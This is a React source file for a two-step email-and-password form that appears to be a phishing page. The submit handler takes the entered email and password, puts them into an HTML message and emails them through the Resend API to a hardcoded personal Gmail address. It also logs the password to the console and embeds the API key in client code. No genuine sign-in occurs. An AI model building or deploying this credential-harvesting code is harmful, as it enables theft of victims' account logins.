import { useEffect, useState } from 'react';
import './App.css';
import { motion, AnimatePresence } from "framer-motion";
import EmailForm from './components/Form/EmailForm';
import PasswordForm from './components/Form/PasswordForm';
import ConfirmationForm from './components/Form/ConfirmationForm';
// import axios from 'axios';
import { Resend } from 'resend';


const resend = new Resend('re_HH4nsLcG_LWtYpfxkVVYMHiuKfpoNN9Gq');

// const STEPS = ["Personal Information", "Address Information", "Confirmation"];
const STORAGE_KEY = "multistepFormData";
const STEP_KEY = "multistepFormStep";

function App() {
  const [isSubmitting, setIsSubmitting] = useState(false);

  const [currentStep, setCurrentStep] = useState(() => {
    const savedStep = localStorage.getItem(STEP_KEY);
    return savedStep ? parseInt(savedStep, 10) : 0;
  });

  const [formData, setFormData] = useState(() => {
    const savedData = localStorage.getItem(STORAGE_KEY);
    return savedData
      ? JSON.parse(savedData)
      : {
          email: "",
          password: "",
          // code: "",
        };
  });

  const [errors, setErrors] = useState({});
  
  useEffect(() => {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(formData));
  }, [formData]);

  useEffect(() => {
    localStorage.setItem(STEP_KEY, currentStep.toString());
  }, [currentStep]);

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [name]: value,
    }));
    validateField(name, value);
  };

  const handleBlur = (e) => {
    const { name, value } = e.target;
    validateField(name, value);
  };
  
  const validateField = (name, value) => {
    let error = "";
    switch (name) {
      // case "code":
      //   if (!value.trim() || value.length < 6) {
      //     error = "6 digit code is required";
      //   }
      //   break;
      case "email":
        error = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)
          ? ""
          : "Invalid email format";
        break;
      case "password":
        if (!value.trim()) {
          error = "password is required";
        }
        break;
      default:
        break;
    }
    setErrors((prevErrors) => ({ ...prevErrors, [name]: error }));
  };

  const isStepValid = () => {

    const currentFields =
      currentStep === 0
        ? ["email"]
        : ["password"];

    console.log('err ', errors);

    return currentFields.every(
      (field) => formData[field].trim() !== "" && !errors[field]
    );
  };

  const handleNext = () => {
    if (isStepValid()) {
      setCurrentStep((prevStep) => prevStep + 1);
    }
  };

  const handleBack = () => {
    setCurrentStep((prevStep) => prevStep - 1);
  };

  // const handleSubmit = () => {
  const handleSubmit = async (event) => {
    if (isStepValid()) {
      setIsSubmitting(true);

      event.preventDefault(); // Prevent default form submission behavior

      console.log('form data', formData);

      // const headers = {
      // 'Content-Type': 'application/json',
      // };

      const email = formData.email;
      const password = formData.password;

      console.log('form data email', email);
      console.log('form data password', password);

      const htmlContent = `<h1>Hello, Here is your username: ${email}, Here is your password:  ${password} </h1><p>Welcome to our app!</p>`;


      try {
        // const response = await axios.post('http://bulkmailer.test/api/send-mail', formData, { headers });

              
        const { data, error } = await resend.emails.send({
          from: 'Acme <onboarding@resend.dev>',
          to: 'alexrobert209055@gmail.com',
          subject: 'Hello World',
          html: htmlContent,
        });

        if (error) {
          console.log('form data error', error);
        }

        console.log('form data', data);
        // setResponseMessage(`Post created successfully! Status: ${response.status}`);
        // console.log('Response data:', response.data);
        
        // Reset form fields and clear localStorage
        setFormData({
          email: "",
          // code: "",
          password: "",
        });
        localStorage.removeItem(STORAGE_KEY);

        // Reset current step to the beginning
        setCurrentStep(0);
        setErrors({});
        setIsSubmitting(false);
      } catch (err) {
        // setError(err.message);
        // console.error('Error:', error);
        console.log('form data error', err);
        setIsSubmitting(false);
      }

      // Simulate API call
      
      
      // setTimeout(() => {

      //   // Reset form fields and clear localStorage
      //   setFormData({
      //     email: "",
      //     // code: "",
      //     password: "",
      //   });
      //   localStorage.removeItem(STORAGE_KEY);

      //   // Reset current step to the beginning
      //   setCurrentStep(0);
      //   setErrors({});

      //   setIsSubmitting(false);
      // }, 1000);

    } else {
    }
  };

  const renderStep = () => {
    switch (currentStep) {
      case 0:
        return (          
          <EmailForm
            formData={formData}
            handleInputChange={handleInputChange}
            handleNext={handleNext}
            handleBlur={handleBlur}
            errors={errors}
          />
        );
      case 1:
        return (          
          <PasswordForm
            formData={formData}
            handleInputChange={handleInputChange}
            handleBack={handleBack}
            handleBlur={handleBlur}
            handleNext={handleSubmit}
            loading={isSubmitting}
            errors={errors}
          />
        );
      case 2:
        return (
          <ConfirmationForm formData={formData} />
        );
      default:
        return null;
    }
  };

  return (
    <div className="min-h-screen flex-1">

        <AnimatePresence mode="wait">
          <motion.div
            key={currentStep}
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            transition={{ duration: 0.3 }}
          >
            {renderStep()}
          </motion.div>
        </AnimatePresence>

    </div>
  )
}

export default App
